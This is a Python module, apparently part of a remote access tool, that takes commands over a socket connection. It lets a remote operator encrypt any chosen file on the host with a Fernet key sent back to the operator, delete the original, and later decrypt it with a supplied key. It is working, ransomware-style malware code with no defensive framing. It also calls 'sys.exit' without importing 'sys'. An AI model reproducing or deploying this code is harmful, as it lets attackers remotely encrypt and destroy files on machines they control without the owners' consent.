#!/bin/env python3
from cryptography.fernet import Fernet
import os

def encryptFile(con):
    key = Fernet.generate_key()
    con.sendall(b"Key:\n")
    con.sendall(key)

    fernet = Fernet(key)
    con.sendall(b'\nSpecify file with path: ')
    optDir = con.recv(2048)
    try:
        optDir = str(optDir.decode().strip())
        if os.path.exists(optDir):
            with open(optDir,'rb') as file:
                original = file.read()
            encrypted = fernet.encrypt(original)
            with open(optDir+".jak",'wb') as encrypted_file:
                encrypted_file.write(encrypted)
            os.remove(optDir)
            con.sendall(b"File encrypted")
        else:
            con.sendall(b"The file does not exist")
    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')


def decryptFile(con):
    con.sendall(b'\nSpecify encrypted file with path: ')
    optDir = con.recv(2048)
    con.sendall(b"\nEnter Key: \n")
    key = con.recv(2048)
    
    key = key.strip()
    fernet = Fernet(key)
    try:
        optDir = str(optDir.decode().strip())
        if os.path.exists(optDir):
            with open(optDir,'rb') as file:
                original = file.read()
            decrypted = fernet.decrypt(original)
            optDir = optDir.replace(".jak","")
            with open(optDir,'wb') as decrypted_file:
                decrypted_file.write(decrypted)
            os.remove(optDir+".jak")    
            con.sendall(b"File decrypted")
        else:
            con.sendall(b"The file does not exist")
    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')

def encryptMenu(con):
    menu = b"\n1. Encrypt File\n2. Decrypt File\n"
    con.sendall(menu)
    con.sendall(b"\nSpecify Options: ")
    opt = con.recv(1024)
    try:
        opt = opt.decode()
        opt = int(opt)
        if(opt == 1):
            encryptFile(con)
        elif(opt == 2):
            #con.sendall(b'\nListing file ready')
            decryptFile(con)        
    except ValueError:
        con.sendall(b"\nPlese only send integer value representing each option\n")
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b"\nSomething is wrong\n")
